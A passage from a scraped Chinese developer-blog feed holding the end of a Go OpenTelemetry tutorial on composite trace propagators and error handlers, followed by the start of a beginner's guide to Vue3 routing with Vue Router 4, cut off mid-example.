<p>首先第一个 <code>propagation.TraceContext{}</code>  主要传递 <code>TracerID</code> 和 <code>SpanID</code> 防止断链 （核心）</p>
<p>第二个 <code>propagation.Baggage{}</code> 主要是传递<strong>用户自定义的轻量元数据</strong>（称为行李），比如自己想传一些 <code>user-id=123</code> 或者 <code>order-no=ABC789</code> 存放一些自己想要的业务逻辑相关</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// 类似构造函数 饭后这个组合器   接收参数为下面的接口 只要实现就可以传入 足够的扩展性，也可以自己实现一个放进去</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewCompositeTextMapPropagator</span><span class="hljs-params">(p ...TextMapPropagator)</span></span> TextMapPropagator {
	<span class="hljs-keyword">return</span> compositeTextMapPropagator(p)
}


<span class="hljs-comment">// 实现这个接口就可以 propagation.TraceContext{} 和 propagation.Baggage{} 实现了这个接口</span>
<span class="hljs-keyword">type</span> TextMapPropagator <span class="hljs-keyword">interface</span> {
    
	Inject(ctx context.Context, carrier TextMapCarrier)
    
	Extract(ctx context.Context, carrier TextMapCarrier) context.Context
    
	Fields() []<span class="hljs-type">string</span>
}

<span class="hljs-comment">// 定义这个组合器 组合器顾名思义内部有多个传播器 所以是实现 TextMapPropagator 接口的切片</span>
<span class="hljs-keyword">type</span> compositeTextMapPropagator []TextMapPropagator

<span class="hljs-comment">// 遍历所有组合进来的传播器，依次调用它们的 Inject 方法 比较简单</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p compositeTextMapPropagator)</span></span> Inject(ctx context.Context, carrier TextMapCarrier) {
	<span class="hljs-keyword">for</span> _, i := <span class="hljs-keyword">range</span> p {
		i.Inject(ctx, carrier)
	}
}
<span class="hljs-comment">/*
也是遍历，不同的是有嵌套关系 比如空 ctx 传进来 执行第一个 TraceContext 生成 ctx1 拿着 ctx1 再执行 Baggage 生成 ctx2
 ctx2（追加了 order-no）→ctx1（包含 SpanContext/TraceID）→ctx 大家如果看过我的 Context 文章就知道，当去找存入的值的时候
 它内部会从自己开始一直递归找到根，所以在用法上并不是嵌套，我们不需要一层层剥开  
 后续会讲他们各自的 Extract 方法，到时候结合这里的理解
 */</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p compositeTextMapPropagator)</span></span> Extract(ctx context.Context, carrier TextMapCarrier) context.Context {
	<span class="hljs-keyword">for</span> _, i := <span class="hljs-keyword">range</span> p {
		ctx = i.Extract(ctx, carrier)
	}
	<span class="hljs-keyword">return</span> ctx
}


<span class="hljs-comment">/*
这个主要是 告诉用户 这些传播器会向 header 放入那些字段，比如有的系统对 HTTP Header 有安全白名单，只允许修改指定的 Header 键
这个时候就可以调用这个方法，返回所有传播器向header填入的字段 拿我们这个举例子，["traceparent", "tracestate", "baggage"]
返回的是重后的切片，解释一下 前两个是由 TraceContext 返回的 内部肯定要实现Fields()方法 返回各自要填入的字段
traceparent: 00-4f9f9e8a7b6c5d4e3f2a1b0c9d8e7f6a-1a2b3c4d5e6f7a8b-01    格式： 00-TracerID-SpanID-01 （核心）
tracestate: &lt;vendor1&gt;=&lt;value1&gt;,&lt;vendor2&gt;=&lt;value2&gt;,... 这个就是可选的第三方的键值对，非核心但有用 避免污染核心
baggage: &lt;key1&gt;=&lt;value1&gt;,&lt;key2&gt;=&lt;value2&gt;,...  这个就纯自己业务的键值对 user_id=123  自己想咋填咋填
*/</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p compositeTextMapPropagator)</span></span> Fields() []<span class="hljs-type">string</span> {
    <span class="hljs-comment">// 用map是用于去重的 切片去不了重 这样加进去自动更新成新的</span>
	unique := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">struct</span>{})
    <span class="hljs-comment">// 还是遍历所有的传播器</span>
	<span class="hljs-keyword">for</span> _, i := <span class="hljs-keyword">range</span> p {
		<span class="hljs-keyword">for</span> _, k := <span class="hljs-keyword">range</span> i.Fields() {
			unique[k] = <span class="hljs-keyword">struct</span>{}{}
		}
	}
	
    <span class="hljs-comment">// 再转换为切片 返回</span>
	fields := <span class="hljs-built_in">make</span>([]<span class="hljs-type">string</span>, <span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(unique))
	<span class="hljs-keyword">for</span> k := <span class="hljs-keyword">range</span> unique {
		fields = <span class="hljs-built_in">append</span>(fields, k)
	}
	<span class="hljs-keyword">return</span> fields
}
</code></pre>
<h3 data-id="heading-15"><code>otel.SetErrorHandler(otel.ErrorHandlerFunc())</code> 函数</h3>
<pre><code class="hljs language-bash" lang="bash">内容跟 SetTracerProvider 和 SetTextMapPropagator 一样的 这里主要说一下为什么要设置

如果不设置 OpenTelemetry 内部出错比如某个传播器宕机了或者某处 panic 整个服务挂了，它也不知道该怎么处理这个错误
当设置之后自动调用你的 ErrorHandler，不会影响业务代码

错误处理流程

OpenTelemetry 内部发生错误
         │
         ▼
    otel.Handle(err)
         │
         ▼
    globalErrorHandler.Load() 获取 ErrorHandler
         │
         ▼
    ErrorHandler.Handle(err)
         │
         ├─→ 记录到日志  //我的示例代码就只是简单的做了这个
         ├─→ 发送到监控 （后续可选）
         └─→ 发送告警   （后续可选）
</code></pre>
<p>至此，我们完成了 <code>TracerProvider</code> 的完整初始化。下篇将带大家进入实战环节，看看如何创建 Span、如何实现跨服务的链路追踪。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue3 路由完全指南：从入门到实战，新手也能快速上手]]></title>    <link>https://juejin.cn/post/7602916013877166095</link>    <guid>https://juejin.cn/post/7602916013877166095</guid>    <pubDate>2026-02-05T05:29:48.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602916013877166095" data-draft-id="7602825342229463074" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue3 路由完全指南：从入门到实战，新手也能快速上手"/> <meta itemprop="keywords" content="前端,JavaScript,面试"/> <meta itemprop="datePublished" content="2026-02-05T05:29:48.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="不想秃头的程序员"/> <meta itemprop="url" content="https://juejin.cn/user/2754702534251820"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue3 路由完全指南：从入门到实战，新手也能快速上手
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2754702534251820/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    不想秃头的程序员
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T05:29:48.000Z" title="Thu Feb 05 2026 05:29:48 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Vue3 路由完全指南：从入门到实战，新手也能快速上手</h2>
<p>在 Vue3 项目开发中，路由（Vue Router）是不可或缺的核心模块——它负责管理页面之间的跳转、实现组件的按需加载、处理路由参数传递，甚至控制页面权限。</p>
<p>很多刚接触 Vue3 的新手，在使用路由时总会遇到各种问题：Vue3 路由和 Vue2 有哪些区别？如何配置路由？嵌套路由怎么实现？路由守卫该怎么用？</p>
<p>今天这篇文章，就带你从零吃透 Vue3 + Vue Router 4（路由最新版本）的使用，从环境搭建、基础配置到进阶技巧、实战案例，每一步都有清晰示例，帮你避开坑点，快速运用到实际项目中。</p>
<h3 data-id="heading-1">一、前言：Vue3 路由的核心变化</h3>
<p>首先明确一个重点：Vue3 必须搭配<strong>Vue Router 4.x</strong> 版本（以下简称 Vue Router），它和 Vue2 对应的 Vue Router 3.x 有一些核心差异，新手无需深究底层，但要记住这几点关键变化：</p>
<ul>
<li>不再支持 <code>new VueRouter()</code>，改用 <code>createRouter()</code> 工厂函数创建路由实例，更贴合 Vue3 的组合式 API 风格。</li>
<li>路由模式的配置方式变化，<code>mode: 'history'</code> 改为 <code>history: createWebHistory()</code>。</li>
<li>支持组合式 API 用法，新增 <code>useRouter()</code>、<code>useRoute()</code> 等钩子，替代 Vue2 中的 <code>this.$router</code>、<code>this.$route</code>。</li>
<li>移除了 <code>router-link</code> 的 <code>tag</code> 属性，改用<code>custom</code> + 插槽实现自定义标签。</li>
</ul>
<p>接下来，我们从环境搭建开始，一步步实现 Vue3 路由的各种用法。</p>
<h3 data-id="heading-2">二、环境搭建：安装 Vue Router 4</h3>
<p>首先确保你已经创建了 Vue3 项目（推荐使用 Vite 创建，效率更高），如果还没有创建，先执行以下命令：</p>
<pre><code class="hljs language-shell" lang="shell">// 创建 Vue3 项目（Vite）
npm create vite@latest vue3-router-demo -- --template vue
cd vue3-router-demo
npm install

// 安装 Vue Router 4（核心步骤）
npm install vue-router@4
</code></pre>
<p>安装完成后，我们就可以开始配置路由了。</p>
<h3 data-id="heading-3">三、基础配置：实现简单的页面跳转</h3>
<p>Vue3 路由的配置核心分为 3 步：<strong>创建路由实例 → 定义路由规则 → 在入口文件挂载路由</strong>，下面我们一步步操作。</p>
<h4 data-id="heading-4">1. 新建路由配置文件</h4>
<p>在项目的 <code>src</code> 目录下，新建 <code>router</code> 文件夹，然后创建 <code>index.js</code> 文件（路由的核心配置文件），写入以下代码：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// src/router/index.js</span>
<span class="hljs-comment">// 1. 引入必要的依赖</span>
<span class="hljs-keyword">import</span> { createRouter, createWebHistory } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue-router'</span>

<span class="hljs-comment">// 2. 引入需要跳转的组件（页面级组件）</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Home</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'../views/Home.vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">About</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'../views/About.vue'</span>

<span class="hljs-comment">// 3. 定义路由规则（数组形式，每一个对象对应一个路由）</span>
<span class="hljs-keyword">const</span> routes = [
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/'</span>, <span class="hljs-comment">// 路由路径（URL 中显示的路径）</span>
    <span class="hljs-attr">name</span>: <span class="hljs-string">'Home'</span>, <span class="hljs-comment">// 路由名称（可选，用于编程式导航）</span>
    <span class="hljs-attr">component</span>: <span class="hljs-title class_">Home</span> <span class="hljs-comment">// 路由对应的组件</span>
  },
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/about'</span>,
    <span class="hljs-attr">name</span>: <span class="hljs-string">'About'</span>,
    <span class="hljs-attr">component</span>: <span class="hljs-title class_">About</span>
    <span class="hljs-comment">// 也可以使用懒加载（推荐，优化性能）</span>
    <span class="hljs-comment">// component: () =&gt; import('../views/About.vue')</span>
  }
]

<span class="hljs-comment">// 4. 创建路由实例</span>
<span class="hljs-keyword">const</span> router = <span class="hljs-title function_">createRouter</span>({
  <span class="hljs-attr">history</span>: <span class="hljs-title function_">createWebHistory</span>(<span class="hljs-keyword">import</span>.<span class="hljs-property">meta</span>.<span class="hljs-property">env</span>.<span class="hljs-property">BASE_URL</span>), <span class="hljs-comment">// 路由模式（history 模式）</span>
  routes <span class="hljs-comment">// 传入路由规则（等同于 routes: routes）</span>
})

<span class="hljs-comment">// 5. 导出路由实例（供入口文件挂载）</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> router
</code></pre>
<h4 data-id="heading-5">2. 挂载路由到 Vue 实例</h4>
<p>打开项目入口文件 <code>src/main.js</code>，引入路由实例，并用 <code>use()</code> 方法挂载，代码如下：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// src/main.js</span>
<span class="hljs-keyword">import</span> { createApp } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./App.vue'</span>
<span class="hljs-comment">// 引入路由实例</span>
<span class="hljs-keyword">import</span> router <span class="hljs-keyword">from</span> <span class="hljs-string">'./router'</span>

<span class="hljs-comment">// 创建 App 实例，并挂载路由</span>
<span class="hljs-title function_">createApp</span>(<span class="hljs-title class_">App</span>)
  .<span class="hljs-title function_">use</span>(router) <span class="hljs-comment">// 挂载路由</span>
  .<span class="hljs-title function_">mount</span>(<span class="hljs-string">'#app'</span>)
</code></pre>
<h4 data-id="heading-6">3. 新建页面组件</h4>
<p>在 <code>src</code> 目录下，新建 <code>views</code> 文件夹（用于存放页面级组件），分别创建 <code>Home.vue</code> 和 <code>About.vue</code> 两个组件：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// src/views/Home.vue</span>
&lt;template&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"home"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>首页<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>这是 Vue3 路由的首页页面<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
&lt;/template&gt;

<span class="hljs-comment">// src/views/About.vue</span>
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"about"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>关于我们<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>这是 Vue3 路由的关于页面<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span></span>
</code></pre>
<h4 data-id="heading-7">4. 使用 router-link 和 router-view</h4>
<p>路由挂载完成后，需要在<code>App.vue</code> 中使用两个核心组件：</p>
<ul>
<li><code>&lt;router-link&gt;</code>：用于实现路由跳转（类似 a 标签，但不会刷新页面），默认渲染为 a 标签。</li>
<li><code>&lt;router-view&gt;</code>：用于渲染当前路由对应的组件（页面内容会显示在这里）。</li>
</ul>
<p>修改 <code>App.vue</code> 代码：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// src/App.vue</span>
&lt;template&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"app"</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- 路由导航：跳转按钮 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">nav</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">router-link</span> <span class="hljs-attr">to</span>=<span class="hljs-string">"/"</span>&gt;</span>首页<span class="hljs-tag">&lt;/<span class="hljs-name">router-link</span>&gt;</span> |
      <span class="hljs-tag">&lt;<span class="hljs-name">router-link</span> <span class="hljs-attr">to</span>=<span class="hljs-string">"/about"</span>&gt;</span>关于我们<span class="hljs-tag">&lt;/<span class="hljs-name">router-link</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span>
    
    <span class="hljs-comment">&lt;!-- 路由视图：渲染当前路由对应的组件 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">router-view</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
&lt;/template&gt;

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
<span class="hljs-comment">/* 激活路由的样式（默认类名：router-link-active） */</span>
<span class="hljs-selector-class">.router-link-active</span> {
  <span class="hljs-attribute">color</span>: <span class="hljs-number">#42b983</span>;
  <span class="hljs-attribute">text-decoration</span>: none;
  <span class="hljs-attribute">font-weight</span>: bold;
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span>
</code></pre>
<h4 data-id="heading-8">5. 运行测试</h4>
<p>执行 <code>npm run dev</code> 启动项目，访问本地地址，点击“首页”和“关于我们”，就能实现页面无刷新跳转，并且激活的路由会显示对应样式——这就是 Vue3 路由的基础用法！</p>
<h5 data-id="heading-9">补充：路由懒加载（推荐优化）</h5>
<p>上面的配置中，我们直接引入了 Home 和 About 组件，这种方式会在项目打包时，将所有页面组件打包到一个文件中，导致文件体积过大，影响首屏加载速度。</p>
<p>推荐使用<strong>路由懒加载</strong>（按需加载），只有当用户访问该路由时，才会加载对应的组件，优化首屏性能，修改路由规则如下：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// src/router/index.js</span>
<span class="hljs-keyword">const</span> routes = [
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/'</span>,
    <span class="hljs-attr">name</span>: <span class="hljs-string">'Home'</span>,
    <span class="hljs-comment">// 懒加载写法：箭头函数 + import()</span>
    <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'../views/Home.vue'</span>)
  },
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/about'</span>,
    <span class="hljs-attr">name</span>: <span class="hljs-string">'About'</span>,
    <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'../views/About.vue'</span>)
  }
]
</code></pre>
<h3 data-id="heading-10">四、核心用法：路由参数传递</h3>
<p>开发中经常需要在页面跳转时传递参数（比如详情页需要接收列表页的 ID），Vue3 路由支持两种常用的参数传递方式：<strong>动态路由参数</strong>和<strong>查询参数</strong>。</p>
<h4 data-id="heading-11">1. 动态路由参数（推荐，用于传递必填参数）</h4>
<p>动态路由参数是将参数嵌入到路由路径中，格式为 <code>path: '/xxx/:参数名'</code>，适用于详情页、编辑页等需要唯一标识的场景。</p>
<h5 data-id="heading-12">步骤 1：配置动态路由</h5>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// src/router/index.js</span>
<span class="hljs-comment">// 引入详情页组件</span>
<span class="hljs-keyword">const</span> routes = [
  <span class="hljs-comment">// 其他路由...</span>
  {
    <span class="hljs-comment">// 动态路由：id 是参数名（可自定义）</span>
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/user/:id'</span>,
    <span class="hljs-attr">name</span>: <span class="hljs-string">'User'</span>,
    <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'../views/User.vue'</span>)
  }
]
</code></pre>
<h5 data-id="heading-13">步骤 2：跳转时传递参数</h5>
<p>有两种跳转方式（声明式导航 + 编程式导航），分别对应参数传递：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 1. 声明式导航（router-link）：直接在 to 中拼接参数</span>
&lt;router-link to=<span class="hljs-string">"/user/123"</span>&gt;用户<span class="hljs-number">123</span>&lt;/router-link&gt;
<span class="hljs-comment">// 或者用对象形式（推荐，更灵活）</span>
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">router-link</span> <span class="hljs-attr">:to</span>=<span class="hljs-string">"{ name: 'User', params: { id: 123 } }"</span>&gt;</span>用户123<span class="hljs-tag">&lt;/<span class="hljs-name">router-link</span>&gt;</span></span>

<span class="hljs-comment">// 2. 编程式导航（useRouter）：通过 push 方法传递</span>
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-comment">// 引入 useRouter 钩子（组合式 API）</span>
<span class="hljs-keyword">import</span> { useRouter } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue-router'</span>
<span class="hljs-keyword">const</span> router = <span class="hljs-title function_">useRouter</span>()

<span class="hljs-comment">// 跳转并传递参数</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">goToUser</span> = (<span class="hljs-params"/>) =&gt; {
  router.<span class="hljs-title function_">push</span>({
    <span class="hljs-attr">name</span>: <span class="hljs-string">'User'</span>, <span class="hljs-comment">// 必须用 name 匹配，不能用 path（path 需手动拼接参数）</span>
    <span class="hljs-attr">params</span>: { <span class="hljs-attr">id</span>: <span class="hljs-number">123</span> }
  })
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>
</code></pre>
<h5 data-id="heading-14">步骤 3：接收动态路由参数</h5>
<p>在目标组件（User.vue）中，使用 <code>useRoute()</code> 钩子获取路由信息，进而获取参数：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// src/views/User.vue</span>
&lt;template&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"user"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>用户详情页<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>用户 ID：{{ $route.params.id }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span> 
   <span class="hljs-comment">&lt;!-- 或者用组合式 API（推荐） --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>用户 ID：{{ route.params.id }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
&lt;/template&gt;

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-comment">// 引入 useRoute 钩子，获取当前路由信息</span>
<span class="hljs-keyword">import</span> { useRoute } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue-router'</span>
<span class="hljs-keyword">const</span> route = <span class="hljs-title function_">useRoute</span>()

<span class="hljs-comment">// 打印参数（可在生命周期或方法中使用）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(route.<span class="hljs-property">params</span>.<span class="hljs-property">id</span>) <span class="hljs-comment">// 输出：123</span>
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>
</code></pre>
<h4 data-id="heading-15">2. 查询参数（用于传递可选参数）</h4>
<p>查询参数类似 GET 请求的参数，格式为<code>path?key=value&amp;key2=value2</code>，适用于筛选、搜索等可选参数场景，不需要修改路由配置。</p>
<h5 data-id="heading-16">步骤 1：跳转时传递查询参数</h5>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 1. 声明式导航</span>
&lt;router-link to=<span class="hljs-string">"/search?keyword=vue3&amp;page=1"</span>&gt;搜索 <span class="hljs-title class_">Vue3</span>&lt;/router-link&gt;
<span class="hljs-comment">// 或者用对象形式（推荐）</span>
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">router-link</span> <span class="hljs-attr">:to</span>=<span class="hljs-string">"{ 
  path: '/search', 
  query: { keyword: 'vue3', page: 1 } 
}"</span>&gt;</span>搜索 Vue3<span class="hljs-tag">&lt;/<span class="hljs-name">router-link</span>&gt;</span></span>

<span class="hljs-comment">// 2. 编程式导航</span>
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { useRouter } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue-router'</span>
